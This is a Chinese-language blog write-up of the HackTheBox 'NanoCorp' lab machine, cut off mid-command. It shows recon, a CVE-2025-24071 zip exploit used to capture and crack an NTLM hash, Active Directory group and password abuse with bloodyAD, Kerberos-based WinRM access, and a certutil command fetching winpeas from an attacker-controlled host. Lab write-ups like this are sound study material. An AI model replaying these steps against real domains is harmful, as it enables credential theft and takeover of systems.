{"pageProps":{"postData":{"id":"HackTheBoxSeason9 - NanoCorp","contentHtml":"<h1>Season9 - NanoCorp</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/NanoCorp\">https://app.hackthebox.com/machines/NanoCorp</a></p>\n</blockquote>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-python\">➜ nmap -sT -<span class=\"hljs-built_in\">min</span>-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.93</span>   \nStarting Nmap <span class=\"hljs-number\">7.95</span> ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">11</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">24</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.93</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.048</span>s latency).\nNot shown: <span class=\"hljs-number\">65515</span> filtered tcp ports (no-response)\nPORT      STATE SERVICE\n<span class=\"hljs-number\">53</span>/tcp    <span class=\"hljs-built_in\">open</span>  domain\n<span class=\"hljs-number\">80</span>/tcp    <span class=\"hljs-built_in\">open</span>  http\n<span class=\"hljs-number\">88</span>/tcp    <span class=\"hljs-built_in\">open</span>  kerberos-sec\n<span class=\"hljs-number\">135</span>/tcp   <span class=\"hljs-built_in\">open</span>  msrpc\n<span class=\"hljs-number\">139</span>/tcp   <span class=\"hljs-built_in\">open</span>  netbios-ssn\n<span class=\"hljs-number\">389</span>/tcp   <span class=\"hljs-built_in\">open</span>  ldap\n<span class=\"hljs-number\">445</span>/tcp   <span class=\"hljs-built_in\">open</span>  microsoft-ds\n<span class=\"hljs-number\">464</span>/tcp   <span class=\"hljs-built_in\">open</span>  kpasswd5\n<span class=\"hljs-number\">593</span>/tcp   <span class=\"hljs-built_in\">open</span>  http-rpc-epmap\n<span class=\"hljs-number\">636</span>/tcp   <span class=\"hljs-built_in\">open</span>  ldapssl\n<span class=\"hljs-number\">3268</span>/tcp  <span class=\"hljs-built_in\">open</span>  globalcatLDAP\n<span class=\"hljs-number\">3269</span>/tcp  <span class=\"hljs-built_in\">open</span>  globalcatLDAPssl\n<span class=\"hljs-number\">5986</span>/tcp  <span class=\"hljs-built_in\">open</span>  wsmans\n<span class=\"hljs-number\">9389</span>/tcp  <span class=\"hljs-built_in\">open</span>  adws\n<span class=\"hljs-number\">49664</span>/tcp <span class=\"hljs-built_in\">open</span>  unknown\n<span class=\"hljs-number\">49668</span>/tcp <span class=\"hljs-built_in\">open</span>  unknown\n<span class=\"hljs-number\">57330</span>/tcp <span class=\"hljs-built_in\">open</span>  unknown\n<span class=\"hljs-number\">57335</span>/tcp <span class=\"hljs-built_in\">open</span>  unknown\n<span class=\"hljs-number\">57361</span>/tcp <span class=\"hljs-built_in\">open</span>  unknown\n<span class=\"hljs-number\">65042</span>/tcp <span class=\"hljs-built_in\">open</span>  unknown\n</code></pre>\n<pre><code class=\"hljs language-python\">➜ nmap -sT -A -p $(cat port | awk -F <span class=\"hljs-string\">'/'</span> <span class=\"hljs-string\">'{print $1}'</span> | paste -sd <span class=\"hljs-string\">','</span>) <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.93</span>\nStarting Nmap <span class=\"hljs-number\">7.95</span> ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">11</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">25</span> CST\nStats: <span class=\"hljs-number\">0</span>:01:07 elapsed; <span class=\"hljs-number\">0</span> hosts completed (<span class=\"hljs-number\">1</span> up), <span class=\"hljs-number\">1</span> undergoing Script Scan\nNSE Timing: About <span class=\"hljs-number\">91.96</span>% done; ETC: <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">27</span> (<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> remaining)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.93</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.55</span>s latency).\n\nPORT     STATE SERVICE       VERSION\n<span class=\"hljs-number\">53</span>/tcp   <span class=\"hljs-built_in\">open</span>  domain        Simple DNS Plus\n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-built_in\">open</span>  http          Apache httpd <span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.58</span> (OpenSSL/<span class=\"hljs-number\">3.1</span><span class=\"hljs-number\">.3</span> PHP/<span class=\"hljs-number\">8.2</span><span class=\"hljs-number\">.12</span>)\n|_http-server-header: Apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.58</span> (Win64) OpenSSL/<span class=\"hljs-number\">3.1</span><span class=\"hljs-number\">.3</span> PHP/<span class=\"hljs-number\">8.2</span><span class=\"hljs-number\">.12</span>\n|_http-title: Did <span class=\"hljs-keyword\">not</span> follow redirect to http://nanocorp.htb/\n<span class=\"hljs-number\">88</span>/tcp   <span class=\"hljs-built_in\">open</span>  kerberos-sec  Microsoft Windows Kerberos (server time: <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">11</span> <span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">57</span>:55Z)\n<span class=\"hljs-number\">135</span>/tcp  <span class=\"hljs-built_in\">open</span>  msrpc         Microsoft Windows RPC\n<span class=\"hljs-number\">139</span>/tcp  <span class=\"hljs-built_in\">open</span>  netbios-ssn   Microsoft Windows netbios-ssn\n<span class=\"hljs-number\">389</span>/tcp  <span class=\"hljs-built_in\">open</span>  ldap          Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)\n<span class=\"hljs-number\">445</span>/tcp  <span class=\"hljs-built_in\">open</span>  microsoft-ds?\n<span class=\"hljs-number\">464</span>/tcp  <span class=\"hljs-built_in\">open</span>  kpasswd5?\n<span class=\"hljs-number\">593</span>/tcp  <span class=\"hljs-built_in\">open</span>  ncacn_http    Microsoft Windows RPC over HTTP <span class=\"hljs-number\">1.0</span>\n<span class=\"hljs-number\">636</span>/tcp  <span class=\"hljs-built_in\">open</span>  tcpwrapped\n<span class=\"hljs-number\">3268</span>/tcp <span class=\"hljs-built_in\">open</span>  ldap          Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)\n<span class=\"hljs-number\">3269</span>/tcp <span class=\"hljs-built_in\">open</span>  tcpwrapped\n<span class=\"hljs-number\">5986</span>/tcp <span class=\"hljs-built_in\">open</span>  ssl/http      Microsoft HTTPAPI httpd <span class=\"hljs-number\">2.0</span> (SSDP/UPnP)\n| ssl-cert: Subject: commonName=dc01.nanocorp.htb\n| Subject Alternative Name: DNS:dc01.nanocorp.htb\n| Not valid before: <span class=\"hljs-number\">2025</span>-04-06T22:<span class=\"hljs-number\">58</span>:<span class=\"hljs-number\">43</span>\n|_Not valid after:  <span class=\"hljs-number\">2026</span>-04-06T23:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">43</span>\n| tls-alpn:\n|_  http/<span class=\"hljs-number\">1.1</span>\n|_ssl-date: TLS randomness does <span class=\"hljs-keyword\">not</span> represent time\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/<span class=\"hljs-number\">2.0</span>\n<span class=\"hljs-number\">9389</span>/tcp <span class=\"hljs-built_in\">open</span>  mc-nmf        .NET Message Framing\nWarning: OSScan results may be unreliable because we could <span class=\"hljs-keyword\">not</span> find at least <span class=\"hljs-number\">1</span> <span class=\"hljs-built_in\">open</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning (JUST GUESSING): Microsoft Windows <span class=\"hljs-number\">2022</span>|<span class=\"hljs-number\">2012</span>|<span class=\"hljs-number\">2016</span> (<span class=\"hljs-number\">89</span>%)\nOS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016\nAggressive OS guesses: Microsoft Windows Server <span class=\"hljs-number\">2022</span> (<span class=\"hljs-number\">89</span>%), Microsoft Windows Server <span class=\"hljs-number\">2012</span> R2 (<span class=\"hljs-number\">85</span>%), Microsoft Windows Server <span class=\"hljs-number\">2016</span> (<span class=\"hljs-number\">85</span>%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (test conditions non-ideal).\nNetwork Distance: <span class=\"hljs-number\">2</span> hops\nService Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n|   <span class=\"hljs-number\">3</span>:<span class=\"hljs-number\">1</span>:<span class=\"hljs-number\">1</span>:\n|_    Message signing enabled <span class=\"hljs-keyword\">and</span> required\n| smb2-time:\n|   date: <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">11</span>-11T14:<span class=\"hljs-number\">58</span>:<span class=\"hljs-number\">16</span>\n|_  start_date: N/A\n|_clock-skew: 6h31m49s\n\nTRACEROUTE (using proto <span class=\"hljs-number\">1</span>/icmp)\nHOP RTT       ADDRESS\n<span class=\"hljs-number\">1</span>   <span class=\"hljs-number\">758.68</span> ms <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.14</span><span class=\"hljs-number\">.1</span>\n<span class=\"hljs-number\">2</span>   <span class=\"hljs-number\">758.91</span> ms <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.93</span>\n\nOS <span class=\"hljs-keyword\">and</span> Service detection performed. Please report <span class=\"hljs-built_in\">any</span> incorrect results at https://nmap.org/submit/ .\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">69.94</span> seconds\n</code></pre>\n<h3>枚举</h3>\n<p>80 端口</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image1.png\" alt=\"image.png\"></p>\n<p>目录扫描</p>\n<pre><code class=\"hljs language-python\">➜ gobuster <span class=\"hljs-built_in\">dir</span> -w /usr/share/wordlists/dirbuster/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt -x text,<span class=\"hljs-built_in\">zip</span> -u http://nanocorp.htb/\n===============================================================\nGobuster v3<span class=\"hljs-number\">.6</span>\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://nanocorp.htb/\n[+] Method:                  GET\n[+] Threads:                 <span class=\"hljs-number\">10</span>\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt\n[+] Negative Status codes:   <span class=\"hljs-number\">404</span>\n[+] User Agent:              gobuster/<span class=\"hljs-number\">3.6</span>\n[+] Extensions:              text,<span class=\"hljs-built_in\">zip</span>\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/img                  (Status: <span class=\"hljs-number\">301</span>) [Size: <span class=\"hljs-number\">334</span>] [--> http://nanocorp.htb/img/]\n/css                  (Status: <span class=\"hljs-number\">301</span>) [Size: <span class=\"hljs-number\">334</span>] [--> http://nanocorp.htb/css/]\n/js                   (Status: <span class=\"hljs-number\">301</span>) [Size: <span class=\"hljs-number\">333</span>] [--> http://nanocorp.htb/js/]\n/examples             (Status: <span class=\"hljs-number\">503</span>) [Size: <span class=\"hljs-number\">401</span>]\n/licenses             (Status: <span class=\"hljs-number\">403</span>) [Size: <span class=\"hljs-number\">420</span>]\n/%<span class=\"hljs-number\">20</span>                  (Status: <span class=\"hljs-number\">403</span>) [Size: <span class=\"hljs-number\">301</span>]\n/IMG                  (Status: <span class=\"hljs-number\">301</span>) [Size: <span class=\"hljs-number\">334</span>] [--> http://nanocorp.htb/IMG/]\n</code></pre>\n<p>主站是看着没有什么的，尝试一下爆一下子域名</p>\n<pre><code class=\"hljs language-python\">➜ ffuf -u <span class=\"hljs-string\">'http://nanocorp.htb/'</span> -H <span class=\"hljs-string\">'host:FUZZ.nanocorp.htb'</span> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-<span class=\"hljs-number\">110000.</span>txt -fc <span class=\"hljs-number\">301</span>\n\n        /<span class=\"hljs-string\">'___\\  /'</span>___\\           /<span class=\"hljs-string\">'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://nanocorp.htb/\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n :: Header           : Host: FUZZ.nanocorp.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response status: 301\n________________________________________________\n\n:: Progress: [114442/114442] :: Job [1/1] :: 840 req/sec :: Duration: [0:02:37] :: Errors: 0 ::\n</span></code></pre>\n<p>换个字典，爆破到存在 <code>hire</code> 子域名</p>\n<pre><code class=\"hljs language-python\">➜ ffuf -u <span class=\"hljs-string\">'http://nanocorp.htb/'</span> -H <span class=\"hljs-string\">'host:FUZZ.nanocorp.htb'</span> -w /usr/share/wordlists/fuzzDicts/subdomainDicts/dic1.txt -fc <span class=\"hljs-number\">301</span> \n\n        /<span class=\"hljs-string\">'___\\  /'</span>___\\           /<span class=\"hljs-string\">'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://nanocorp.htb/\n :: Wordlist         : FUZZ: /usr/share/wordlists/fuzzDicts/subdomainDicts/dic1.txt\n :: Header           : Host: FUZZ.nanocorp.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response status: 301\n________________________________________________\n\nhire                    [Status: 200, Size: 2520, Words: 646, Lines: 68, Duration: 71ms]\n[WARN] Caught keyboard interrupt (Ctrl-C)\n</span></code></pre>\n<h2>CVE-2025-24071</h2>\n<p>将 <code>hire.nanocorp.htb</code> 添加到 <code>/etc/hosts</code> ，然后访问</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image2.png\" alt=\"image.png\"></p>\n<p>能上传 <code>zip</code> 文件，上传后提示我们提取成功，并会回复我们</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image3.png\" alt=\"image.png\"></p>\n<p>这让我想起 <code>ZipSlip</code></p>\n<p>随后我在文件上传功能中测试了很多，但都是没有效果</p>\n<p>或者漏洞并不存在于 web 中，而是存在 windows 中</p>\n<p>我通过搜索引擎搜索中能找到很多关于 winzip 或者 2025-24071 的漏洞</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image4.png\" alt=\"image.png\"></p>\n<p>winzip 的漏洞没有提供 POC，而且报告比较含糊，而 CVE-2025-24071 有，所以这里索性尝试下</p>\n<blockquote>\n<p>NSFOCUS CERT 检测到微软近期发布了一项安全更新，旨在修复 Windows 文件资源管理器中的一个严重欺骗漏洞，该漏洞编号为 <strong>CVE-2025-24071</strong> 。此漏洞的 CVSS 评分为 7.5，表明其严重性较高。该问题源于 Windows 资源管理器中 <code>.library-ms</code> 文件的隐式信任和自动文件解析行为。未经身份验证的攻击者可以通过构建包含恶意 SMB 路径的 RAR/ZIP 文件来利用此漏洞。解压缩后，这将触发 SMB 身份验证请求，从而可能暴露用户的 NTLM 哈希值。目前，针对此漏洞的概念验证 (PoC) 攻击代码已公开，因此该漏洞构成当前威胁。强烈建议受影响的用户立即应用此补丁以降低风险。</p>\n</blockquote>\n<p>生成 exploit.zip</p>\n<pre><code class=\"hljs language-python\">➜  CVE-<span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">24071</span> git:(main) ✗ python exploit.py -i &#x3C;your-i -f exploit\n\n          ______ ____    ____  _______       ___     ___    ___    _____        ___    _  _      ___    ______   __  \n         /      |\\   \\  /   / |   ____|     |__ \\   / _ \\  |__ \\  | ____|      |__ \\  | || |    / _ \\  |____  | /_ | \n        |  ,----<span class=\"hljs-string\">' \\   \\/   /  |  |__    ______ ) | | | | |    ) | | |__    ______ ) | | || |_  | | | |     / /   | | \n        |  |       \\      /   |   __|  |______/ /  | | | |   / /  |___ \\  |______/ /  |__   _| | | | |    / /    | | \n        |  `----.   \\    /    |  |____       / /_  | |_| |  / /_   ___) |       / /_     | |   | |_| |   / /     | | \n         \\______|    \\__/     |_______|     |____|  \\___/  |____| |____/       |____|    |_|    \\___/   /_/      |_| \n                                                \n                                                \n                                                Windows File Explorer Spoofing Vulnerability (CVE-2025-24071)\n                    by ThemeHackers\n    \nCreating exploit with filename: exploit.library-ms\nTarget IP: &#x3C;your-ip>\n\nGenerating library file...\n✓ Library file created successfully\n\nCreating ZIP archive...\n✓ ZIP file created successfully\n\nCleaning up temporary files...\n✓ Cleanup completed\n\nProcess completed successfully!\nOutput file: exploit.zip\nRun this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.\n</span></code></pre>\n<p><code>responder</code> 监听</p>\n<pre><code class=\"hljs language-python\">➜ responder -I tun0\n</code></pre>\n<p>然后上传刚刚生成 <code>exploit.zip</code></p>\n<p>过了一会 <code>responder</code> 就能抓到了</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image5.png\" alt=\"image.png\"></p>\n<p>通过 <code>hashcat</code> 进行爆破</p>\n<pre><code class=\"hljs language-python\">➜ hashcat -m <span class=\"hljs-number\">5600</span> <span class=\"hljs-built_in\">hash</span> /usr/share/wordlists/rockyou.txt\n</code></pre>\n<p>得到密码 <code>dksehdgh712!@#</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image6.png\" alt=\"image.png\"></p>\n<p>测试凭据</p>\n<pre><code class=\"hljs language-python\">➜ nxc smb <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.93</span> -u <span class=\"hljs-string\">'WEB_SVC'</span> -p <span class=\"hljs-string\">'dksehdgh712!@#'</span>                                     \nSMB         <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.93</span>     <span class=\"hljs-number\">445</span>    DC01             [*] Windows Server <span class=\"hljs-number\">2022</span> Build <span class=\"hljs-number\">20348</span> x64 (name:DC01) (domain:nanocorp.htb) (signing:<span class=\"hljs-literal\">True</span>) (SMBv1:<span class=\"hljs-literal\">False</span>) \nSMB         <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.93</span>     <span class=\"hljs-number\">445</span>    DC01             [+] nanocorp.htb\\WEB_SVC:dksehdgh712!@<span class=\"hljs-comment\"># </span>\n</code></pre>\n<pre><code class=\"hljs language-python\">➜ nxc winrm <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.93</span> -u <span class=\"hljs-string\">'WEB_SVC'</span> -p <span class=\"hljs-string\">'dksehdgh712!@#'</span>                                 \nWINRM-SSL   <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.93</span>     <span class=\"hljs-number\">5986</span>   DC01             [*] Windows Server <span class=\"hljs-number\">2022</span> Build <span class=\"hljs-number\">20348</span> (name:DC01) (domain:nanocorp.htb)\n  arc4 = algorithms.ARC4(<span class=\"hljs-variable language_\">self</span>._key)\nWINRM-SSL   <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.93</span>     <span class=\"hljs-number\">5986</span>   DC01             [-] nanocorp.htb\\WEB_SVC:dksehdgh712!@<span class=\"hljs-comment\">#</span>\n</code></pre>\n<h2>横向移动</h2>\n<h3>路径探寻</h3>\n<p>上寻血猎犬</p>\n<p>这里的需要设置一下 <code>dns-timeout</code> ，我这里总是会超时</p>\n<pre><code class=\"hljs language-python\">➜ bloodhound-python -d nanocorp.htb -u <span class=\"hljs-string\">'WEB_SVC'</span> -p <span class=\"hljs-string\">'dksehdgh712!@#'</span> -dc dc01.nanocorp.htb -ns <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.93</span> -c <span class=\"hljs-built_in\">all</span> --<span class=\"hljs-built_in\">zip</span> --dns-timeout <span class=\"hljs-number\">1000</span>\n</code></pre>\n<p>能给自己添加到 <code>IT_SUPPORT</code> ，并且 <code>IT_SUPPORT</code> 可以修改 <code>MONITORING_SVC</code> 的密码</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image7.png\" alt=\"image.png\"></p>\n<h3>Got MONITORING_SVC shell</h3>\n<p>这些操作都可以通过 <code>bloodyAD</code> 来完成</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># 添加组操作</span>\n➜ bloodyad -d <span class=\"hljs-string\">'nanocorp.htb'</span> -u <span class=\"hljs-string\">'WEB_SVC'</span> -p <span class=\"hljs-string\">'dksehdgh712!@#'</span> -i <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.93</span> add groupMember IT_SUPPORT WEB_SVC\n[+] WEB_SVC added to IT_SUPPORT\n</code></pre>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># 强制修改密码</span>\n➜ bloodyad -d <span class=\"hljs-string\">'nanocorp.htb'</span> -u <span class=\"hljs-string\">'WEB_SVC'</span> -p <span class=\"hljs-string\">'dksehdgh712!@#'</span> -i <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.93</span> <span class=\"hljs-built_in\">set</span> password MONITORING_SVC Admin@<span class=\"hljs-number\">123</span>\n[+] Password changed successfully!\n</code></pre>\n<p>完成后测试凭据，发现提示 <code>STATUS_ACCOUNT_RESTRICTION</code></p>\n<pre><code class=\"hljs language-python\">nxc smb <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.93</span> -u <span class=\"hljs-string\">'MONITORING_SVC'</span> -p <span class=\"hljs-string\">'Admin@123'</span>\n</code></pre>\n<p>查看一下用户 <code>MONITORING_SVC</code> 所属组，发现其是 <code>Protected Users</code> 组成员</p>\n<pre><code class=\"hljs language-python\">➜ bloodyad -d <span class=\"hljs-string\">'nanocorp.htb'</span> -u <span class=\"hljs-string\">'WEB_SVC'</span> -p <span class=\"hljs-string\">'dksehdgh712!@#'</span> -i <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.93</span> get membership <span class=\"hljs-string\">'CN=MONITORING_SVC,OU=AD_MONITORING,DC=NANOCORP,DC=HTB'</span>\n\ndistinguishedName: CN=Users,CN=Builtin,DC=nanocorp,DC=htb\nobjectSid: S-<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">5</span>-<span class=\"hljs-number\">32</span>-<span class=\"hljs-number\">545</span>\nsAMAccountName: Users\n\ndistinguishedName: CN=Remote Management Users,CN=Builtin,DC=nanocorp,DC=htb\nobjectSid: S-<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">5</span>-<span class=\"hljs-number\">32</span>-<span class=\"hljs-number\">580</span>\nsAMAccountName: Remote Management Users\n\ndistinguishedName: CN=Domain Users,CN=Users,DC=nanocorp,DC=htb\nobjectSid: S-<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">5</span>-<span class=\"hljs-number\">21</span>-<span class=\"hljs-number\">2261381271</span>-<span class=\"hljs-number\">1331810270</span>-<span class=\"hljs-number\">697239744</span>-<span class=\"hljs-number\">513</span>\nsAMAccountName: Domain Users\n\ndistinguishedName: CN=Protected Users,CN=Users,DC=nanocorp,DC=htb\nobjectSid: S-<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">5</span>-<span class=\"hljs-number\">21</span>-<span class=\"hljs-number\">2261381271</span>-<span class=\"hljs-number\">1331810270</span>-<span class=\"hljs-number\">697239744</span>-<span class=\"hljs-number\">525</span>\nsAMAccountName: Protected Users\n</code></pre>\n<p>一般可以通过 Kerberos 验证即可</p>\n<pre><code class=\"hljs language-python\">➜ getTGT.py nanocorp.htb/MONITORING_SVC:<span class=\"hljs-string\">'Admin@123'</span> \n  <span class=\"hljs-keyword\">import</span> pkg_resources\nImpacket v0<span class=\"hljs-number\">.12</span><span class=\"hljs-number\">.0</span> - Copyright Fortra, LLC <span class=\"hljs-keyword\">and</span> its affiliated companies \n\n[*] Saving ticket <span class=\"hljs-keyword\">in</span> MONITORING_SVC.ccache\n\n➜ export KRB5CCNAME=MONITORING_SVC.ccache \n</code></pre>\n<p>还需要生成 <code>krb5.conf</code></p>\n<pre><code class=\"hljs language-python\">➜ nxc smb <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.93</span> -u <span class=\"hljs-string\">'WEB_SVC'</span> -p <span class=\"hljs-string\">'dksehdgh712!@#'</span> --generate-krb5-file /etc/krb5.conf\nSMB         <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.93</span>     <span class=\"hljs-number\">445</span>    DC01             [*] Windows Server <span class=\"hljs-number\">2022</span> Build <span class=\"hljs-number\">20348</span> x64 (name:DC01) (domain:nanocorp.htb) (signing:<span class=\"hljs-literal\">True</span>) (SMBv1:<span class=\"hljs-literal\">False</span>) \nSMB         <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.93</span>     <span class=\"hljs-number\">445</span>    DC01             [+] nanocorp.htb\\WEB_SVC:dksehdgh712!@<span class=\"hljs-comment\"># </span>\n</code></pre>\n<p>再次测试凭据，这次可以正常了</p>\n<pre><code class=\"hljs language-python\">➜ nxc smb <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.93</span> -k --use-kcache          \nSMB         <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.93</span>     <span class=\"hljs-number\">445</span>    DC01             [*] Windows Server <span class=\"hljs-number\">2022</span> Build <span class=\"hljs-number\">20348</span> x64 (name:DC01) (domain:nanocorp.htb) (signing:<span class=\"hljs-literal\">True</span>) (SMBv1:<span class=\"hljs-literal\">False</span>) \nSMB         <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.93</span>     <span class=\"hljs-number\">445</span>    DC01             [+] NANOCORP.HTB\\MONITORING_SVC <span class=\"hljs-keyword\">from</span> ccache\n</code></pre>\n<p><code>evil-winrm</code> 一直连不上，这里换成 <code>winrmexec</code></p>\n<pre><code class=\"hljs language-python\">➜ python winrmexec/winrmexec.py -dc-ip <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.93</span> nanocorp.htb/MONITORING_SVC:<span class=\"hljs-string\">'Admin@123'</span>@dc01.nanocorp.htb -k -ssl -port <span class=\"hljs-number\">5986</span>\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image8.png\" alt=\"image.png\"></p>\n<p>能读取 user.txt</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image9.png\" alt=\"image.png\"></p>\n<h3>Got Root.txt via CVE-2024-0670</h3>\n<p>枚举可写对象</p>\n<pre><code class=\"hljs language-python\">➜  NanoCorp bloodyad -d <span class=\"hljs-string\">'nanocorp.htb'</span> -i <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.93</span> -H dc01.nanocorp.htb -k get writable\n\ndistinguishedName: CN=S-<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">5</span>-<span class=\"hljs-number\">11</span>,CN=ForeignSecurityPrincipals,DC=nanocorp,DC=htb\npermission: WRITE\n\ndistinguishedName: CN=monitoring_svc,OU=AD_Monitoring,DC=nanocorp,DC=htb\npermission: WRITE\n</code></pre>\n<p>上传 <code>winpeas64</code> ，<code>certutil</code> 被杀毒拦了</p>\n<pre><code class=\"hljs language-python\">PS C:\\tools> certutil -urlcache -split -f http://&#x3C;your-ip>/winpeas64.exe\nAt line:<span class=\"hljs-number\">1</span> char:<span class=\"hljs-number\">1</span>\n+ certutil -urlcache -split -f 